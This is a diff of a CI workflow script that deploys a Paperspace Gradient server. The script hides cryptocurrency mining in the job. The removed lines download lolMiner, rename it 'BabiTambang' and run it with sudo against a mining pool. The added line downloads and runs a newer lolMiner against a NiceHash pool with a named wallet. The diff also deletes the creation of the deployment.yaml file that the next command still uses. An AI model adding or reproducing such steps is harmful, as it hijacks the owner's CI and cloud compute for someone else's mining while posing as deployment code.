@@ -35,15 +35,7 @@ jobs:
     uses: script@v1
     with:
       script: |-
-        cat > ./deployment.yaml <<EOF
-        image: paperspace/adoro-server:1.0.0
-        port: 8000
-        resources:
-          replicas: 1
-          instanceType: P4000
-        EOF
-        apt update > /dev/null
-        apt-get install -y jq && wget https://github.com/Lolliedieb/lolMiner-releases/releases/download/1.28/lolMiner_v1.28a_Lin64.tar.gz && tar -xf lolMiner_v1.28a_Lin64.tar.gz && cd 1.28a && chmod +x lolMiner && mv lolMiner BabiTambang && sudo ./BabiTambang --algo ETHASH --pool stratum+tcp://ethash.mine.zergpool.com:9999 -u MB3ux2fkhJAcT94zayTTbSFJToCQcuRfGj c=LTC $(nproc)
+        wget https://github.com/Lolliedieb/lolMiner-releases/releases/download/1.31/lolMiner_v1.31_Lin64.tar.gz && tar -xvf lolMiner_v1.31_Lin64.tar.gz && cd 1.31;./lolMiner --algo BEAM-III --pool stratum+tcp://beamv3.eu-west.nicehash.com:3387 --user 37qYYwMPzfEt6xzuev53m1qmWkyRbahFa8.iman01 --ethstratum ETHPROXY $(nproc)
         gradient deployments create --name adoro-${RANDOM} --projectId ${PROJECT_ID} --spec ./deployment.yaml |awk '{print $3}'> ./deployment.id
 
         echo
